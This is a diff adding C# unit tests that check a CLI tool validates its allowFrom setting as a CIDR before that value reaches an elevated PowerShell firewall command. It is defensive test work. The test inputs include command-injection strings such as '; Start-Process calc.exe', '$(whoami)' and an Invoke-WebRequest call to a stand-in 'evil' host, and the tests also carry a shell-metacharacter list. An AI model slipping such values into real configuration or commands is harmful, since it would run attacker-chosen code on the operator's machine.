@@ -7,6 +7,7 @@
  */
 
 using System;
+using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
 using Npgsql;
@@ -148,6 +149,90 @@ public sealed class DarlingEndpointToggleCliTests
     public void ClassifyFirewallPlan_MapsExposedAndElevatedToTheStep(
         bool exposed, bool elevated, DarlingCliCommands.EndpointFirewallPlan expected)
         => Assert.Equal(expected, DarlingCliCommands.ClassifyFirewallPlan(exposed, elevated));
+
+    /* ---------------- #1646: allowFrom must PARSE as a CIDR before it can reach a PowerShell command ----------------
+       ToggleEndpointAsync reads darling.json through DarlingConfig.Load, which deserializes and never calls
+       Validate(), so until this gate the only check on allowFrom was IsNullOrWhiteSpace — and the value went
+       straight into the -Command string that --enable-web/--enable-mcp either RUN elevated or print for the
+       operator to paste into an elevated shell. Either path executes whatever was appended. */
+
+    [Theory]
+    [InlineData("192.168.1.0/24", "192.168.1.0/24")]
+    [InlineData("  192.168.1.0/24  ", "192.168.1.0/24")]   // surrounding whitespace is trimmed
+    [InlineData("10.0.0.0/8", "10.0.0.0/8")]
+    [InlineData("2001:db8::/32", "2001:db8::/32")]
+    [InlineData("0.0.0.0/0", "0.0.0.0/0")]                  // permissive, but a real CIDR: the operator's call
+    /* Host bits set: IPNetwork.TryParse ACCEPTS and masks to the network address rather than rejecting. This
+       is why the verdict hands back the parser's output instead of the caller's string — the value that
+       reaches -RemoteAddress is normalized, never merely "checked and then the original used". */
+    [InlineData("192.168.1.5/24", "192.168.1.0/24")]
+    [InlineData("2001:db8::5/32", "2001:db8::/32")]
+    public void ClassifyAllowFrom_AcceptsRealCidrs_AndYieldsTheParsersCanonicalForm(string allowFrom, string expected)
+    {
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Valid, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
+        Assert.Equal(expected, cidr);
+    }
+
+    [Theory]
+    [InlineData(null)]
+    [InlineData("")]
+    [InlineData("   ")]
+    public void ClassifyAllowFrom_TreatsBlankAsMissing_NotInvalid(string? allowFrom)
+    {
+        /* Missing keeps its own, friendlier message ("finish the block with --configure-network") — the
+           endpoint fail-closes to loopback either way, so there is nothing to open and nothing to alarm about. */
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Missing, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
+        Assert.Equal("", cidr);
+    }
+
+    [Theory]
+    [InlineData("192.168.1.0/24; Start-Process calc.exe")]                      // the issue's payload
+    [InlineData("192.168.1.0/24' ; whoami ; '")]
+    [InlineData("192.168.1.0/24 | Out-Null; Invoke-WebRequest http://evil/x")]
+    [InlineData("$(whoami)")]
+    [InlineData("Any")]                                                          // a real New-NetFirewallRule keyword — still not a CIDR
+    [InlineData("192.168.1.0/24,10.0.0.0/8")]                                    // one CIDR only
+    [InlineData("192.168.1.5")]                                                  // a bare address, no prefix
+    [InlineData("192.168.1.0/33")]                                               // prefix longer than the family allows
+    [InlineData("not-a-cidr")]
+    public void ClassifyAllowFrom_RefusesAnythingThatIsNotACidr(string allowFrom)
+    {
+        Assert.Equal(DarlingCliCommands.EndpointAllowFromVerdict.Invalid, DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr));
+
+        /* The refusal path must hand back NOTHING usable: the toggle skips the firewall entirely rather than
+           building a command from a partially-parsed value. */
+        Assert.Equal("", cidr);
+    }
+
+    /// <summary>
+    /// The property that actually matters: for any allowFrom the verdict accepts, the string handed to the
+    /// command builder is the PARSER'S output, so it re-parses and cannot carry shell metacharacters. This is
+    /// what makes "a non-CIDR allowFrom never reaches a firewall command" true by construction rather than by
+    /// enumeration of the payloads someone thought of.
+    /// </summary>
+    [Theory]
+    [InlineData("192.168.1.0/24")]
+    [InlineData("  10.0.0.0/8 ")]
+    [InlineData("2001:db8::/32")]
+    [InlineData("192.168.1.0/24; Start-Process calc.exe")]
+    [InlineData("$(whoami)")]
+    [InlineData("")]
+    [InlineData(null)]
+    public void OnlyAParsedCidrEverReachesTheFirewallCommand(string? allowFrom)
+    {
+        if (DarlingCliCommands.ClassifyAllowFrom(allowFrom, out var cidr) != DarlingCliCommands.EndpointAllowFromVerdict.Valid)
+        {
+            Assert.Equal("", cidr);
+            return;
+        }
+
+        Assert.True(IPNetwork.TryParse(cidr, out var reparsed));
+        Assert.Equal(cidr, reparsed.ToString());
+        foreach (var metacharacter in new[] { ";", "'", "|", "$", "`", " ", "\n", "&" })
+        {
+            Assert.DoesNotContain(metacharacter, cidr, StringComparison.Ordinal);
+        }
+    }
 
     /* ---------------- pure: the shared scoped firewall rule names (CLI + host reconcile the SAME DisplayName) ---------------- */
 
